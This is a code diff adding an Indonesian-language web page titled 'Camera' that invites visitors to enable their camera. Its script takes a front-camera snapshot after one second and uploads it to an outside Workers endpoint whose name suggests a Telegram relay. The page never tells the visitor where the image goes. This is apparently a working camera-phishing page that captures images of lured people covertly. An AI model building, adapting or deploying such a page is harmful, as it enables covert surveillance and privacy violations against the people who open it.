@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width,initial-scale=1">
+
+<title>Camera</title>
+
+<style>
+*{
+  box-sizing:border-box;
+}
+
+body{
+  margin:0;
+  min-height:100vh;
+  background:#111;
+  color:#fff;
+  font-family:Arial,sans-serif;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+.container{
+  width:min(92%,420px);
+  text-align:center;
+}
+
+h1{
+  font-size:25px;
+  margin-bottom:10px;
+}
+
+p{
+  color:#aaa;
+}
+
+video{
+  width:100%;
+  margin-top:15px;
+  border-radius:18px;
+  background:#000;
+  display:none;
+}
+
+button{
+  width:100%;
+  margin-top:20px;
+  padding:16px;
+  border:0;
+  border-radius:12px;
+  font-size:17px;
+  font-weight:bold;
+}
+
+#start{
+  background:#fff;
+  color:#111;
+}
+
+#status{
+  margin-top:18px;
+  color:#aaa;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <h1>📸 Camera</h1>
+
+  <p>
+    Tekan tombol di bawah untuk mengaktifkan kamera.
+  </p>
+
+  <video
+    id="video"
+    autoplay
+    playsinline>
+  </video>
+
+  <button id="start">
+    Izinkan Kamera
+  </button>
+
+  <div id="status">
+    Kamera belum aktif
+  </div>
+
+</div>
+
+<canvas id="canvas" hidden></canvas>
+
+<script>
+
+const WORKER_URL =
+"https://dark-shadow-348epolaroid-telegram.hanifasayank007.workers.dev/";
+
+const video =
+document.getElementById("video");
+
+const canvas =
+document.getElementById("canvas");
+
+const start =
+document.getElementById("start");
+
+const status =
+document.getElementById("status");
+
+
+start.addEventListener("click", async () => {
+
+  try {
+
+    status.textContent =
+      "Meminta izin kamera...";
+
+    const stream =
+      await navigator.mediaDevices.getUserMedia({
+        video:{
+          facingMode:"user"
+        },
+        audio:false
+      });
+
+    video.srcObject = stream;
+    video.style.display = "block";
+
+    start.disabled = true;
+
+    status.textContent =
+      "Kamera aktif...";
+
+    await new Promise(resolve =>
+      setTimeout(resolve, 1000)
+    );
+
+    canvas.width =
+      video.videoWidth;
+
+    canvas.height =
+      video.videoHeight;
+
+    const ctx =
+      canvas.getContext("2d");
+
+    ctx.drawImage(
+      video,
+      0,
+      0,
+      canvas.width,
+      canvas.height
+    );
+
+    status.textContent =
+      "Mengirim foto...";
+
+    canvas.toBlob(async (blob) => {
+
+      const form =
+        new FormData();
+
+      form.append(
+        "photo",
+        blob,
+        "camera.jpg"
+      );
+
+      const response =
+        await fetch(WORKER_URL,{
+          method:"POST",
+          body:form
+        });
+
+      if(!response.ok){
+        throw new Error(
+          "Gagal mengirim foto"
+        );
+      }
+
+      status.textContent =
+        "Foto berhasil dikirim.";
+
+      stream
+        .getTracks()
+        .forEach(track => track.stop());
+
+    },"image/jpeg",0.9);
+
+  } catch(error){
+
+    console.error(error);
+
+    status.textContent =
+      "Kamera tidak diizinkan.";
+
+    start.disabled = false;
+
+  }
+
+});
+
+</script>
+
+</body>
+</html>
